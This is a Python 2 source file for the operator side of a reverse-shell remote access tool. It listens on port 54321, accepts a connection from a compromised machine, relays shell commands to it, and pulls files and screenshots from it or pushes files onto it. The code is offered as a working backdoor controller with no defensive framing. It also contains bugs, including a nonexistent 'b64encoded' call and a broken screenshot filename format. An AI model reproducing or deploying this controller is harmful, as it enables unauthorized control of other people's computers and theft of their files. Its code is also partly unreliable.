import socket
import json
import base64


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data)

def reliable_recv():
    data = ""
    while True:
         try:
             data = data + target.recv(1024)
             return json.loads(data)
         except ValueError:
             continue

def shell():
    global count
    while True:
        command = raw_input("* shell#~%s:" % str(ip))
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "failed To Upload"
                reliable_send(base64.b64encoded(failed))
        elif command[:10] == "screenshot":
            with open("screenshot" % count, "wb") as screen:
                image = reliable_recv()
                image_decode = base64.b64decode(image)
                if image_decode[:4] == "[!!]":
                    print(image_decode)
                else:
                    screen.write(image_decode)
                    count += 1
        else:
            result = reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("*********",54321))
    s.listen(5)
    print("[+] Listening For Incoming Connections")
    target, ip = s.accept()
    print("[+] Connection Established From: %s" % str(ip))

count = 1
server()
shell()
s.close()